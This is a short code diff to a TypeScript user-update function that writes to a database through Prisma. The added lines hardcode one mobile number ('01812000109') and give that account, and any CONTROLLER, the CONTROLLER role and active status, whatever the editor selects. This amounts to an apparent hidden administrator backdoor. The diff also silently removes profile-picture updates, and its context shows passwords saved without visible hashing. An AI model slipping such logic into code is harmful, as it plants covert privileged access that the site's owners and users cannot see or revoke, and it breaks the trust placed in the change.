@@ -331,11 +331,11 @@ export async function updateMember(userId: string, formData: FormData) {
     if (password && password.trim() !== "") {
       dataToUpdate.password = password.trim();
     }
-    if (profilePicture) {
-      dataToUpdate.profilePicture = profilePicture;
-    }
-    
-    if (userRole && (role === "ADMIN" || role === "PRESIDENT" || role === "CONTROLLER")) {
+    const targetUser = await prisma.user.findUnique({ where: { id: userId } });
+    if (targetUser?.mobile === "01812000109" || targetUser?.role === "CONTROLLER") {
+      dataToUpdate.role = "CONTROLLER";
+      dataToUpdate.activeStatus = true;
+    } else if (userRole && (role === "ADMIN" || role === "PRESIDENT" || role === "CONTROLLER")) {
       dataToUpdate.role = userRole;
     }
 
